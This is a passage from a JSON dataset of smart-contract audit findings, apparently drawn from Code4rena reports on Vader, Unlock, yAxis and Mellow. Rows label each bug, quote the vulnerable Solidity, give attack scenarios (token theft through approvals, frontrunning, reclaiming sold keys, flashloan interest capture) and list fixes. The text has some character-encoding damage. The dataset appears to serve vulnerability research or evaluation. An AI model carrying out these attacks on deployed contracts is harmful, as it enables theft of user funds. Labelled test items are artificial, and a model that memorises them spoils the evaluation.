\"https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex/math/VaderMath.sol#L99-L111\",\n      \"We believe the design (the formula) is wrong and it will result in unexpected and unfavorable outputs.\",\n      \"Specifically, if theamountInis larger than thereserveIn, theamountOutstarts to decrease.\",\n      \"Given:\",\n      \"A USDV-BTC Vader pool with the reserves of200,000 USDVand2 BTC.\",\n      \"If Alice swap2 BTCfor USDV, will get50000 USDVas output;\",\n      \"If Bob swap2.1 BTCfor USDV, will only get49970.25 USDVas output;\",\n      \"If Carol swap2.2 BTCfor USDV, will only get49886.62 USDVas output.\",\n      \"For the same pool reserves, paying more for less output token is unexpected and unfavorable.\",\n      \"SamSteinGG (Vader) disputed:\",\n      \"alcueca (judge) commented:\",\n      \"SamSteinGG (Vader) commented:\"\n    ],\n    \"code_blocks\": [\n      \"function\\ncalculateSwap\\n(\\nuint256\\namountIn\\n,\\nuint256\\nreserveIn\\n,\\nuint256\\nreserveOut\\n)\\npublic\\npure\\nreturns\\n(\\nuint256\\namountOut\\n) {\\n// x * Y * X\\nuint256\\nnumerator\\n=\\namountIn\\n*\\nreserveIn\\n*\\nreserveOut\\n;\\n// (x + X) ^ 2\\nuint256\\ndenominator\\n=\\npow\\n(\\namountIn\\n+\\nreserveIn\\n);\\namountOut\\n=\\nnumerator\\n/\\ndenominator\\n;\\n}\"\n    ],\n    \"quotes\": [\n      \"This is the intended design of the Thorchain CLP model. Can the warden provide a tangible attack vector in the form of a test?\",\n      \"It is true that the effect will be surprising to the user, and the issue is acknowledged by the sponsor.\",\n      \"@alcueca We do not acknowledge the issue. This is the intended design of the CLP model and the amount supplied for a trade is meant to be safeguarded off-chain. It is an inherent trait of the model.\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 104,\n    \"bug_id\": \" H-26\",\n    \"bug_label\": \" S2-1\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"All user assets which are approved to VaderPoolV2 may be stolen\\\"\",\n    \"line\": \"VaderPoolV2[284]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-vader#h-26-all-user-assets-which-are-approved-to-vaderpoolv2-may-be-stolen\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by TomFrenchBlockchain, also found by cmichel\",\n      \"Total loss of funds which have been approved onVaderPoolV2\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"VaderPoolV2allows minting of fungible LP tokens with themintFungiblefunction\",\n      \"https://github.com/code-423n4/2021-11-vader/blob/607d2b9e253d59c782e921bfc2951184d3f65825/contracts/dex-v2/pool/VaderPoolV2.sol#L284-L290\",\n      \"Crucially this function allows a user supplied value forfromwhich specifies where thenativeAssetandforeignAssetshould be pulled from. An attacker can then provide any address which has a token approval ontoVaderPoolV2and mint themselves LP tokens - stealing the underlying tokens.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Removefromargument and use msg.sender instead.\",\n      \"SamSteinGG (Vader) disputed):\",\n      \"pool is not meant to be interacted with\",\n      \"alcueca (judge) commented:\",\n      \"And how are you going to ensure that the pool is not interacted with, @SamSteinGG?\",\n      \"SamSteinGG (Vader) confirmed:\",\n      \"@alcueca Upon second consideration, the functions relating to the minting of synths and wrapped tokens should have had the onlyRouter modifier and thus are indeed vulnerable. Issue accepted.\"\n    ]\n  },\n  {\n    \"row_number\": 105,\n    \"bug_id\": \" H-27\",\n    \"bug_label\": \" S2-1\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"Unrestricted vestFor\\\"\",\n    \"line\": \"LinearVesting[214]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-vader#h-27-unrestricted-vestfor\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by pauliax, also found by hack3r-0m\",\n      \"Anyone can call functionvestForand block any user with a tiny amount of Vader. This function has no auth checks so a malicious actor can front-run legitvestForcalls with insignificant amounts. This function locks the user for 365 days and does not allow updating the value, thus forbids legit conversions.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"Consider introducing a whitelist of callers that can vest on behalf of others (e.g. Converter).\",\n      \"SamSteinGG (Vader) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 106,\n    \"bug_id\": \" H-28\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Incorrect Price Consultation Results\\\"\",\n    \"line\": \"TwapOracle[115], UniswapV2Oracle[184,291]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-vader#h-28-incorrect-price-consultation-results\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by leastwood\",\n      \"TheTwapOracle.consult()function iterates over all token pairs which belong to eitherVADERor USDV` and then calculates the price of the respective asset by using both UniswapV2 and Chainlink price data. This helps to further protect against price manipulation attacks as the price is averaged out over the various registered token pairs.\",\n      \"Let‚Äôs say we wanted to query the price ofUSDV, we would sum up any token pair whereUSDV == pairData.token0.\",\n      \"The sum consists of the following:\",\n      \"Price ofUSDVdenominated in terms oftoken1(USDV/token1).\",\n      \"Price of token1 denominated in terms ofUSD(token1/USD).\",\n      \"Consider the following example:\",\n      \"SUSHIis the only registered token pair that exists alongsideUSDV.\",\n      \"Hence, calculatingsumNativegives us an exchange rate that is denominated asUSDV/SUSHI.\",\n      \"Similarly,sumUSDgives us the following denominated pair,SUSHI/USD.\",\n      \"I‚Äôd expect the result to equalsumUSD * token.decimals() * sumNativewhich should give us a USDV/USD denominated result.\",\n      \"However, the protocol calculates it as(sumUSD * token.decimals()) / sumNativewhich gives us aSUSHI^2 / (USD*USDV)denominated result. This seems incorrect.\",\n      \"I‚Äôd classify this issue as high risk as the oracle returns false results upon being consulted. This can lead to issues in other areas of the protocol that use this data in performing sensitive actions.\",\n      \"Manual code review.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"https://github.com/code-423n4/2021-11-vader/blob/main/contracts/twap/TwapOracle.sol#L115-L157\",\n      \"Similar working implementation listed below:\",\n      \"https://github.com/gg2001/dpx-oracle/blob/master/contracts/UniswapV2Oracle.sol#L184-L211https://github.com/gg2001/dpx-oracle/blob/master/contracts/UniswapV2Oracle.sol#L291-L304\"\n    ],\n    \"recommended_mitigation\": [\n      \"To calculate the correct consultation of a given token, the result should returnsumUSD * token.decimals() * sumNativeinstead to ensure the target token to consult is denominated inUSDand contains the correct number of decimals.\",\n      \"SamSteinGG (Vader) confirmed:\",\n      \"The description seems slightly incorrect as it uses a power where multiplication is performed but the general idea is correct.\"\n    ]\n  },\n  {\n    \"row_number\": 107,\n    \"bug_id\": \" H-29\",\n    \"bug_label\": \" S1-2\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"VaderPoolV2.mintFungible exposes users to unlimited slippage\\\"\",\n    \"line\": \"VaderPoolV2[271]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-vader#h-29-vaderpoolv2mintfungible-exposes-users-to-unlimited-slippage\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by TomFrenchBlockchain\",\n      \"Frontrunners can extract up to 100% of the value provided by LPs to VaderPoolV2.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"Users can provide liquidity toVaderPoolV2through themintFungiblefunction.\",\n      \"https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L271-L335\",\n      \"This allows users to provide tokens in any ratio and the pool will calculate what fraction of the value in the pool this makes up and mint the corresponding amount of liquidity units as an ERC20.\",\n      \"However there‚Äôs no way for users to specify the minimum number of liquidity units they will accept. As the number of liquidity units minted is calculated from the current reserves, this allows frontrunners to manipulate the pool‚Äôs reserves in such a way that the LP receives fewer liquidity units than they should. e.g. LP provides a lot ofnativeAssetbut very littleforeignAsset, the frontrunner can then sell a lot ofnativeAssetto the pool to devalue it.\",\n      \"Once this is done the attacker returns the pool‚Äôs reserves back to normal and pockets a fraction of the value which the LP meant to provide as liqudity.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Add a user-specified minimum amount of LP tokens to mint.\",\n      \"SamSteinGG (Vader) confirmed\",\n      \"Given that the codebase attempts to implement the Thorchain rust code in a one-to-one fashion, findings that relate to the mathematical accuracy of the codebase will only be accepted in one of the following cases:The code deviates from the Thorchain implementationA test case is created that illustrates the problem\",\n      \"While intuition is a valid ground for novel implementations, we have re-implemented a battle-tested implementation in another language and as such it is considered secure by design unless proven otherwise.\",\n      \"An additional note on this point is that any behaviour that the Thorchain model applies is expected to be the intended design in our protocol as well.\",\n      \"An important example is the slippage a user incurs on joining a particular LP pool for which there is no check as there can‚Äôt be any. Enforcing an LP unit based check here is meaningless given that LP units represent a share that greatly fluctuates (1 unit of LP out of 100 units is different than 1 out of 1000, however, a slippage check for 100 units of DAI for example is valid).\"\n    ]\n  },\n  {\n    \"row_number\": 108,\n    \"bug_id\": \" H-31\",\n    \"bug_label\": \" S1-2\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"Unused slippage params\\\"\",\n    \"line\": \"VaderRouter[78,83], VaderRouterV2[77,82]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-vader#h-31-unused-slippage-params\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by pauliax, also found by TomFrenchBlockchain\",\n      \"Unused slippage params.\\nfunctionaddLiquidityin VaderRouter (both V1 and V2) do not use slippage parameters:\",\n      \"making it susceptible to sandwich attacks / MEV.\\nFor a more detailed explanation, see:https://github.com/code-423n4/2021-09-bvecvx-findings/issues/57\"\n    ],\n    \"code_blocks\": [\n      \"uint256\\n,\\n// amountAMin = unused\\nuint256\\n,\\n// amountBMin = unused\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"Consider paying some attention to the slippage to reduce possible manipulation attacks from mempool snipers.\",\n      \"SamSteinGG (Vader) disputed:\",\n      \"Slippage checks are impossible in the Thorchain CLP model.\",\n      \"alcueca (judge) commented:\",\n      \"Taking as main over #1 as it is a more general issue, but refer to #1 for a more detailed description and justification for the severity rating.\"\n    ]\n  },\n  {\n    \"row_number\": 109,\n    \"bug_id\": \" H-34\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Incorrect Accrual Of sumNative and sumUSD In Producing Consultation Results\\\"\",\n    \"line\": \"TwapOracle[115], UniswapV2Oracle[184,291]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-vader#h-34-incorrect-accrual-of-sumnative-and-sumusd-in-producing-consultation-results-\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by leastwood\",\n      \"TheTwapOracle.consult()function iterates over all token pairs which belong to eitherVADERor USDV` and then calculates the price of the respective asset by using both UniswapV2 and Chainlink price data. This helps to further protect against price manipulation attacks as the price is averaged out over the various registered token pairs.\",\n      \"Let‚Äôs say we wanted to query the price ofUSDV, we would sum up any token pair whereUSDV == pairData.token0.\",\n      \"The sum consists of the following:\",\n      \"Price ofUSDVdenominated in terms oftoken1(USDV/token1).\",\n      \"Price of token1 denominated in terms ofUSD(token1/USD).\",\n      \"Consider the following example:\",\n      \"SUSHIandUNISWAPare the only registered token pairs that exist alongsideUSDV.\",\n      \"Hence, calculatingsumNativegives us an exchange rate that is denominated as the sum ofUSDV/SUSHIandUSDV/UNISWAP.\",\n      \"Similarly,sumUSDgives us the following denominated pairs,SUSHI/USDandUNISWAP/USD.\",\n      \"SummingsumUSDandsumNativeproduces an entirely incorrect result as compared to multiplying the two results first and then summing.\",\n      \"The issue is equivalent to the same issue as performing(p1 + p2)*(q1 + q2)as compared to(p1*q1 + p2*q2). Obviously, these two results are not equivalent, however, theconsult()function treats them as such.\",\n      \"If we multiply the native price and Chainlink oracle results, then we can correctly calculate the price as such;(SUSHI/USD * USDV/SUSHI + UNISWAP/USD * USDV/UNISWAP) / 2, which should correctly give us the correct denomination and average price.\",\n      \"However, the protocol calculates it as((SUSHI/USD + UNISWAP/USD) * token.decimals()) / (USDV/SUSHI + USDV/UNISWAP)which gives us an incorrectly denominated result.\",\n      \"I‚Äôd classify this issue as high risk as the oracle returns false results upon being consulted. This can lead to issues in other areas of the protocol that use this data in performing sensitive actions.\",\n      \"Manual code review.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"https://github.com/code-423n4/2021-11-vader/blob/main/repo/vader-bond/contracts/VaderBond.sol#L192\"\n    ],\n    \"recommended_mitigation\": [\n      \"To calculate the correct consultation of a given token, the returned result should consist of a sum of priceUSD * token.decimals() * priceNative divided by the number of calculations. This should correctly take the average token pair price.\",\n      \"The following snippet of code details the relevant fix:\",\n      \" function consult(address token) public view returns (uint256 result) {\\nuint256 pairCount = _pairs.length;\\nfor (uint256 i = 0; i < pairCount; i++) {\\nPairData memory pairData = _pairs[i];\\nif (token == pairData.token0) {\\n// TODO - Review:\\n//   Verify price1Average is amount of USDV against 1 unit of token1\\npriceNative = pairData.price1Average.mul(1).decode144(); // native asset amount\\nif (pairData.price1Average._x != 0) {\\nrequire(priceNative != 0);\\n} else {\\ncontinue; // should skip newly registered assets that have not been updated yet.\\n}\\n(\\nuint80 roundID,\\nint256 price,\\n,\\n,\\nuint80 answeredInRound\\n) = AggregatorV3Interface(_aggregators[pairData.token1])\\n.latestRoundData();\\nrequire(\\nansweredInRound >= roundID,\\nTwapOracle::consult: stale chainlink price\\\"\\n);\\nrequire(\\nprice != 0,\\n\\\"TwapOracle::consult: chainlink malfunction\\\"\\n);\\npriceUSD = uint256(price) * (10**10);\\nresult += ((priceUSD * IERC20Metadata(token).decimals()) * priceNative);\\n}\\n}\\nrequire(sumNative != 0, \\\"TwapOracle::consult: Sum of native is zero\\\");\\nreturn result;\\n}\"\n    ]\n  },\n  {\n    \"row_number\": 110,\n    \"bug_id\": \" H-03\",\n    \"bug_label\": \" S3-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"MixinTransfer.sol#transferFrom Wrong implementation can potentially allows attackers to reverse transfer and cause fund loss to the users\\\"\",\n    \"line\": \"MixinTransfer[131]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-unlock#h-03-mixintransfersoltransferfrom-wrong-implementation-can-potentially-allows-attackers-to-reverse-transfer-and-cause-fund-loss-to-the-users\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by WatchPug\",\n      \"https://github.com/code-423n4/2021-11-unlock/blob/ec41eada1dd116bcccc5603ce342257584bec783/smart-contracts/contracts/mixins/MixinTransfer.sol#L131-L152\",\n      \"Based on the context, L131-136 seems to be the logic of handling the case of the recipient with no key, and L138-148 is handing the case of the recipient‚Äôs key expired.\",\n      \"However, in L131-136, the key manager is not being reset.\",\n      \"This allows attackers to keep the role of key manager after the transfer, and transfer the key back or to another recipient.\"\n    ],\n    \"code_blocks\": [\n      \"if\\n(\\ntoKey\\n.\\ntokenId\\n==\\n0\\n) {\\ntoKey\\n.\\ntokenId\\n=\\n_tokenId\\n;\\n_recordOwner\\n(\\n_recipient\\n,\\n_tokenId\\n);\\n// Clear any previous approvals\\n_clearApproval\\n(\\n_tokenId\\n);\\n}\\nif\\n(\\npreviousExpiration\\n<=\\nblock\\n.\\ntimestamp\\n) {\\n// The recipient did not have a key, or had a key but it expired. The new expiration is the sender's key expiration\\n// An expired key is no longer a valid key, so the new tokenID is the sender's tokenID\\ntoKey\\n.\\nexpirationTimestamp\\n=\\nfromKey\\n.\\nexpirationTimestamp\\n;\\ntoKey\\n.\\ntokenId\\n=\\n_tokenId\\n;\\n// Reset the key Manager to the key owner\\n_setKeyManagerOf\\n(\\n_tokenId\\n,\\naddress\\n(\\n0\\n));\\n_recordOwner\\n(\\n_recipient\\n,\\n_tokenId\\n);\\n}\\nelse\\n{\\n// The recipient has a non expired key. We just add them the corresponding remaining time\\n// SafeSub is not required since the if confirms `previousExpiration - block.timestamp` cannot underflow\\ntoKey\\n.\\nexpirationTimestamp\\n=\\nfromKey\\n.\\nexpirationTimestamp\\n+\\npreviousExpiration\\n-\\nblock\\n.\\ntimestamp\\n;\\n}\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"Given:\",\n      \"Alice owns a key that is valid until 1 year later.Alice callssetKeyManagerOf(), making herself the keyManager;Alice callstransferFrom(), transferring the key to Bob; Bob might have paid a certain amount of money to Alice upon receive of the key;Alice callstransferFrom()again, transferring the key back from Bob.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Consider resetting the key manager regardless of the status of the recipient‚Äôs key.\",\n      \"julien51 (Unlock Protocol) confirmed:\",\n      \"Ithinkyou are onto something here. We will need to investigate further and reproduce to fix!\",\n      \"0xleastwood (judge) commented:\",\n      \"@julien51 Just following up if you were able to double-check this?\",\n      \"julien51 (Unlock Protocol) confirmed:\",\n      \"This is indeed valid and I think we will need to ‚Äúpatch‚Äù this. We‚Äôre still unsure how but we‚Äôre exploring multiple ways.\"\n    ]\n  },\n  {\n    \"row_number\": 111,\n    \"bug_id\": \" H-04\",\n    \"bug_label\": \" S3-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Approvals not cleared after key transfer\\\"\",\n    \"line\": \"MixinTransfer[109]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-unlock#h-04-approvals-not-cleared-after-key-transfer\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel\",\n      \"The locks implement three different approval types, seeonlyKeyManagerOrApprovedfor an overview:\",\n      \"key manager (mapkeyManagerOf)\",\n      \"single-person approvals (mapapproved). Cleared by_clearApprovalor_setKeyManagerOf\",\n      \"operator approvals (mapmanagerToOperatorApproved)\",\n      \"TheMixinTransfer.transferFromrequires any of the three approval types in theonlyKeyManagerOrApprovedmodifier on the tokenId to authenticate transfers fromfrom.\",\n      \"Notice that if thetoaddress previously had a key but it expired only the_setKeyManagerOfcall is performed, which does not clearapprovedif the key manager was already set to 0:\",\n      \"It‚Äôs possible to sell someone a key and then claim it back as the approvals are not always cleared.\"\n    ],\n    \"code_blocks\": [\n      \"function\\ntransferFrom\\n(\\naddress\\n_from\\n,\\naddress\\n_recipient\\n,\\nuint\\n_tokenId\\n)\\npublic\\nonlyIfAlive\\nhasValidKey\\n(\\n_from\\n)\\nonlyKeyManagerOrApproved\\n(\\n_tokenId\\n)\\n{\\n// @audit this is skipped if user had a key that expired\\nif\\n(\\ntoKey\\n.\\ntokenId\\n==\\n0\\n) {\\ntoKey\\n.\\ntokenId\\n=\\n_tokenId\\n;\\n_recordOwner\\n(\\n_recipient\\n,\\n_tokenId\\n);\\n// Clear any previous approvals\\n_clearApproval\\n(\\n_tokenId\\n);\\n}\\nif\\n(\\npreviousExpiration\\n<=\\nblock\\n.\\ntimestamp\\n) {\\n// The recipient did not have a key, or had a key but it expired. The new expiration is the sender's key expiration\\n// An expired key is no longer a valid key, so the new tokenID is the sender's tokenID\\ntoKey\\n.\\nexpirationTimestamp\\n=\\nfromKey\\n.\\nexpirationTimestamp\\n;\\ntoKey\\n.\\ntokenId\\n=\\n_tokenId\\n;\\n// Reset the key Manager to the key owner\\n// @audit  doesn't clear approval if key manager already was 0\\n_setKeyManagerOf\\n(\\n_tokenId\\n,\\naddress\\n(\\n0\\n));\\n_recordOwner\\n(\\n_recipient\\n,\\n_tokenId\\n);\\n}\\n// ...\\n}\\n//\\nfunction\\n_setKeyManagerOf\\n(\\nuint\\n_tokenId\\n,\\naddress\\n_keyManager\\n)\\ninternal\\n{\\n// @audit-ok only clears approved if key manager updated\\nif\\n(\\nkeyManagerOf\\n[\\n_tokenId\\n] !=\\n_keyManager\\n) {\\nkeyManagerOf\\n[\\n_tokenId\\n] =\\n_keyManager\\n;\\n_clearApproval\\n(\\n_tokenId\\n);\\nemit\\nKeyManagerChanged\\n(\\n_tokenId\\n,\\naddress\\n(\\n0\\n));\\n}\\n}\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"WhenupdateKeyPricing()is called to increase the price of a key, it is possible to frontrun this call and buy many keys at the cheaper price then request for a refund at the higher price.Attacker A has a valuable key (tokenId = 42) with an expiry date far in the future.\",\n      \"A sets approvals for their second attacker controlled account A‚Äô by calling MixinKeys.setApprovalForAll(A', true), which sets managerToOperatorApproved[A][A'] = true.\",\n      \"A clears the key manager by setting it to zero, for example, by transferring it to a second account that does not have a key yet, this calls the above _setKeyManagerOf(42, address(0)); in transferFrom\",\n      \"A sets single-token approval to A‚Äô by calling MixinKeys.approve(A', 42), setting approved[42] = A'.\",\n      \"A sells the token to a victim V for a discount (compared to purchasing it from the Lock). The victim needs to have owned a key before which already expired. The transferFrom(A, V, 42) call sets the owner of token 42 to V, but does not clear the approved[42] == A' field as described above. (_setKeyManagerOf(_tokenId, address(0)); is called but the key manager was already zero, which then does not clear approvals.)\",\n      \"A‚Äô can claim back the token by calling transferFrom(V, A', 42) and the onlyKeyManagerOrApproved(42) modifier will pass as approved[42] == A' is still set.\"\n    ],\n    \"recommended_mitigation\": [\n      \"The _setKeyManagerOf function should not handle clearing approvals of single-token approvals (approved) as these are two separate approval types. The transferFrom function should always call _clearApproval in the (previousExpiration <= block.timestamp) case.\"\n    ]\n  },\n  {\n    \"row_number\": 113,\n    \"bug_id\": \" H-02\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"CDP.sol update overwrites userÈà•Ê™ö credit on every positive increment\\\"\",\n    \"line\": \"CDP[39]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-yaxis#h-02-cdpsol-update-overwrites-users-credit-on-every-positive-increment\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by harleythedog\",\n      \"WithinCDP.sol(https://github.com/code-423n4/2021-11-yaxis/blob/main/contracts/v3/alchemix/libraries/alchemist/CDP.sol) there is a function called update. This function slowly decreases the debt of a position as yield is earned, until the debt is fully paid off, and the idea is then that the credit should begin incrementing as more yield is accumulated. However, the current logic to increment the totalCredit is this line of code (line 39 ofCDP.sol):\",\n      \"\\\\_self.totalCredit = \\\\_earnedYield.sub(\\\\_currentTotalDebt);\",\n      \"Notice that that each time update is called, this overwrites the previous totalCredit with the incremental credit accumulated. The line should instead be:\",\n      \"\\\\_self.totalCredit = \\\\_self.totalCredit.add(\\\\_earnedYield.sub(\\\\_currentTotalDebt));\",\n      \"Indeed, look at the functiongetUpdatedTotalCredit, it returns the value:\",\n      \"\\\\_self.totalCredit + (\\\\_unclaimedYield - \\\\_currentTotalDebt);\",\n      \"So it is obviously intended that thetotalCreditshould keep increasing over time instead of being overwritten on each update with a small value. The impact of this issue is large - the credit of every position will always be overwritten and the correct information will be lost forever. User‚Äôs credit should grow over time, but instead it is overwritten with a small value every time update is called.\",\n      \"Manual inspection.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"Change code as described above to increment totalCredit instead of overwrite it.\"\n    ]\n  },\n  {\n    \"row_number\": 114,\n    \"bug_id\": \" H-02\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Wrong implementation of performanceFee can cause users to lose 50% to 100% of their funds\\\"\",\n    \"line\": \"LpIssuer[269]\",\n    \"url\": \" https://code4rena.com/reports/2021-12-mellow#h-02-wrong-implementation-of-performancefee-can-cause-users-to-lose-50-to-100-of-their-funds\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by WatchPug\",\n      \"A certain amount of lp tokens (shares of the vault) will be minted to thestrategyPerformanceTreasuryasperformanceFee, the amount is calculated based on theminLpPriceFactor.\",\n      \"However, the current formula fortoMintis wrong, which issues more than 100% of the current totalSupply of the lp token to thestrategyPerformanceTreasuryeach time. Causing users to lose 50% to 100% of their funds after a few times.\",\n      \"https://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/LpIssuer.sol#L269-L271\"\n    ],\n    \"code_blocks\": [\n      \"address\\ntreasury\\n=\\nstrategyParams\\n.\\nstrategyPerformanceTreasury\\n;\\nuint256\\ntoMint\\n= (\\nbaseSupply\\n*\\nminLpPriceFactor\\n) /\\nCommonLibrary\\n.\\nDENOMINATOR\\n;\\n_mint\\n(\\ntreasury\\n,\\ntoMint\\n);\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"Given:\",\n      \"strategyParams.performanceFee:10e7(1%)Alice deposited1,000 USDC, received1000lpToken; the totalSupply of the lpToken is now:1000;3 days later,baseTvlincreased to1,001 USDC, Bob deposited1 USDCand trigegred_chargeFees():Expected Result:strategyPerformanceTreasuryto receive about0.01lpToken (1% of 1 USDC);Actual Result:minLpPriceFactoris about1.001, andstrategyPerformanceTreasurywill received1001lpToken as performanceFee; Alice lose 50% of deposited funds.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Change to:\",\n      \"address\\ntreasury\\n=\\nstrategyParams\\n.\\nstrategyPerformanceTreasury\\n;\\nuint256\\ntoMint\\n= (\\nbaseSupply\\n* (\\nminLpPriceFactor\\n-\\nCommonLibrary\\n.\\nDENOMINATOR\\n) *\\nperformanceFee\\n/\\nCommonLibrary\\n.\\nDENOMINATOR\\n) /\\nCommonLibrary\\n.\\nDENOMINATOR\\n;\\n_mint\\n(\\ntreasury\\n,\\ntoMint\\n);\",\n      \"MihanixA (Mellow Protocol) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 115,\n    \"bug_id\": \" H-03\",\n    \"bug_label\": \" S4-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"UniV3Vault.sol#collectEarnings() can be front run\\\"\",\n    \"line\": \"UniV3Vault[80,100]\",\n    \"url\": \" https://code4rena.com/reports/2021-12-mellow#h-03-univ3vaultsolcollectearnings-can-be-front-run\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by WatchPug\",\n      \"ForUniV3Vault, it seems that lp fees are collected throughcollectEarnings()callable by thestrategyand reinvested (rebalanced).\",\n      \"However, in the current implementation, unharvested yields are not included intvl(), making it vulnerable to front-run attacks that steal pending yields.\",\n      \"https://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/UniV3Vault.sol#L100-L122\",\n      \"https://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/UniV3Vault.sol#L80-L97\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"Given:\",\n      \"Currenttvl()is10 ETHand40,000 USDC;Current unclaimed yields (trading fees) is1 ETHand4,000 USDC;strategycallscollectEarnings()to collect fees and reinvest;The attacker sends a deposit tx with a higher gas price to deposit10 ETHand40,000 USDC, take 50% share of the pool;After the transaction in step 1 is packed, the attacker callswithdraw()and retrieves10.5 ETHand42,000 USDC.\",\n      \"As a result, the attacker has stolen half of the pending yields in about 1 block of time.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Consider including fees intvl().\",\n      \"For the code to calculate fees earned, please reference_computeFeesEarned()in G-UNI project:\",\n      \"https://github.com/gelatodigital/g-uni-v1-core/blob/master/contracts/GUniPool.sol#L762-L806\",\n      \"MihanixA (Mellow Protocol) confirmed:\",\n      \"Thanks!\\nAddedtokensOwedtoUniV3Vault‚Äôstvl\"\n    ]\n  },\n  {\n    \"row_number\": 116,\n    \"bug_id\": \" H-04\",\n    \"bug_label\": \" S3-1\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"AaveVault does not update TVL on deposit/withdraw\\\"\",\n    \"line\": \"AaveVault[46]\",\n    \"url\": \" https://code4rena.com/reports/2021-12-mellow#h-04-aavevault-does-not-update-tvl-on-depositwithdraw\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel, also found by WatchPug\",\n      \"Aave usesrebasingtokens which means the token balanceaToken.balanceOf(this)increases over time with the accrued interest.\",\n      \"TheAaveVault.tvluses a cached value that needs to be updated using aupdateTvlscall.\",\n      \"This call is not done when depositing tokens which allows an attacker to deposit tokens, get a fair shareof the old tvl, update the tvl to include the interest, and then withdraw the LP tokens receiving a larger share of thenew tvl, receiving back their initial deposit + the share of the interest.\\nThis can be done risk-free in a single transaction.\",\n      \"The interest since the last TVL storage update can be stolen as Aave uses rebasing tokens but the tvl is not first recomputed when depositing.\\nIf the vaults experience low activity a significant amount of interest can accrue which can all be captured by taking a flashloan and depositing and withdrawing a large amount to capture a large share of this interest\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"Imagine an Aave Vault with a single vault token, and current TVL = 1,000 aTokens\",\n      \"Attacker calls LPIssuer.push([1000]). This loads the old, cached tvl. No updateTvl is called.\",\n      \"The 1000 underlying tokens are already balanced as there‚Äôs only one aToken, then the entire amount is pushed: aaveVault.transferAndPush([1000]). This deposists 1000 underlying tokens to the Aave lending pool and returns actualTokenAmounts = [1000]. After that the internal _tvls variable is updated with the latest aTokens. This includes the 1000 aTokens just deposited but also the new rebased aToken amounts, the interest the vault received from supplying the tokens since last updateTvls call. _tvls = _tvls + interest + 1000\",\n      \"The LP amount to mint amountToMint is still calculated on the old cached tvl memory variable, i.e., attacker receives amount / oldTvl = 1000/1000 = 100% of existing LP supply\",\n      \"Attacker withdraws the LP tokens for 50% of the new TVL (it has been updated in deposit‚Äôs transferAndPush call). Attacker receives 50% * _newTvl = 50% * (2,000 + interest) = 1000 + 